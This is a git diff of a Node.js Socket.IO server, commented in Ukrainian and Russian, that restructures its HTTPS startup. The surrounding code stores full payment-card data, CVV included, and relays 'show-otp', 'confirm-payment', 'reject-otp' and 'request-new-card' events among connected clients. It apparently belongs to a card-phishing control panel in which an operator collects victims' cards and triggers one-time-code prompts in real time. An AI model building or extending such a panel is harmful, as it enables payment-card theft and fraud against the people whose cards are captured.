@@ -246,68 +246,59 @@ io.on('connection', (socket) => {
   });
 });
 
-// Запуск серверів
-const PORT = process.env.PORT || 3000;
-const HTTPS_PORT = process.env.HTTPS_PORT || 443;
+// Створюємо HTTPS сервер
+const httpsOptions = {
+  key: fs.readFileSync(path.join(__dirname, 'key.pem')),
+  cert: fs.readFileSync(path.join(__dirname, 'cert.pem'))
+};
+const httpsServer = https.createServer(httpsOptions, app);
 
-httpServer.listen(PORT, () => {
-  logger.info(`HTTP сервер запущено на порту ${PORT}`);
+// Налаштовуємо Socket.IO для HTTPS сервера
+const socketIo = socketIO(httpsServer, {
+  cors: {
+    origin: ["http://localhost:3000", "https://localhost"],
+    methods: ["GET", "POST"],
+    credentials: true
+  }
 });
 
-try {
-  const httpsOptions = {
-    key: fs.readFileSync(path.join(__dirname, 'key.pem')),
-    cert: fs.readFileSync(path.join(__dirname, 'cert.pem')),
-    rejectUnauthorized: false
-  };
+// Копіюємо обробники WebSocket для HTTPS
+socketIo.on('connection', (socket) => {
+  logger.info('Новое защищенное WebSocket подключение');
   
-  const httpsServer = https.createServer(httpsOptions, app);
-  const httpsIo = socketIO(httpsServer, {
-    cors: {
-      origin: ["http://localhost:3000", "https://localhost"],
-      methods: ["GET", "POST"],
-      credentials: true
+  // Відправляємо всі картки при підключенні
+  db.all('SELECT id, name, number, exp, cvv, created_at FROM cards', [], (err, rows) => {
+    if (err) {
+      logger.error('Ошибка при получении карт:', err);
+      return;
+    }
+    
+    const cards = rows.map(row => ({
+      ...row,
+      number: row.number ? decrypt(row.number).replace(/\d(?=\d{4})/g, "*") : '****************',
+      cvv: '***'
+    }));
+    
+    socket.emit('cards', cards);
+  });
+  
+  socket.on('show-otp', (data) => socketIo.emit('show-otp-form', data));
+  socket.on('confirm-payment', (data) => socketIo.emit('payment-confirmed', data));
+  socket.on('reject-otp', (data) => socketIo.emit('otp-rejected', data));
+  socket.on('request-new-card', (data) => socketIo.emit('new-card-requested', data));
+  socket.on('chat-message', (msg) => {
+    if (typeof msg === 'string' && msg.trim()) {
+      socketIo.emit('chat', msg);
     }
   });
-
-  // Копіюємо обробники WebSocket для HTTPS
-  httpsIo.on('connection', (socket) => {
-    logger.info('Новое защищенное WebSocket подключение');
-    
-    // Відправляємо всі картки при підключенні
-    db.all('SELECT id, name, number, exp, cvv, created_at FROM cards', [], (err, rows) => {
-      if (err) {
-        logger.error('Ошибка при получении карт:', err);
-        return;
-      }
-      
-      const cards = rows.map(row => ({
-        ...row,
-        number: row.number ? decrypt(row.number).replace(/\d(?=\d{4})/g, "*") : '****************',
-        cvv: '***'
-      }));
-      
-      socket.emit('cards', cards);
-    });
-    
-    socket.on('show-otp', (data) => httpsIo.emit('show-otp-form', data));
-    socket.on('confirm-payment', (data) => httpsIo.emit('payment-confirmed', data));
-    socket.on('reject-otp', (data) => httpsIo.emit('otp-rejected', data));
-    socket.on('request-new-card', (data) => httpsIo.emit('new-card-requested', data));
-    socket.on('chat-message', (msg) => {
-      if (typeof msg === 'string' && msg.trim()) {
-        httpsIo.emit('chat', msg);
-      }
-    });
-    
-    socket.on('disconnect', () => {
-      logger.info('Защищенное WebSocket подключение закрыто');
-    });
-  });
   
-  httpsServer.listen(HTTPS_PORT, () => {
-    logger.info(`HTTPS сервер запущено на порту ${HTTPS_PORT}`);
+  socket.on('disconnect', () => {
+    logger.info('Защищенное WebSocket подключение закрыто');
   });
-} catch (err) {
-  logger.error('Помилка запуску HTTPS сервера:', err);
-}
+});
+
+// Запуск серверів
+const PORT = process.env.PORT || 3000;
+httpsServer.listen(PORT, () => {
+  logger.info(`HTTPS сервер запущено на порту ${PORT}`);
+});
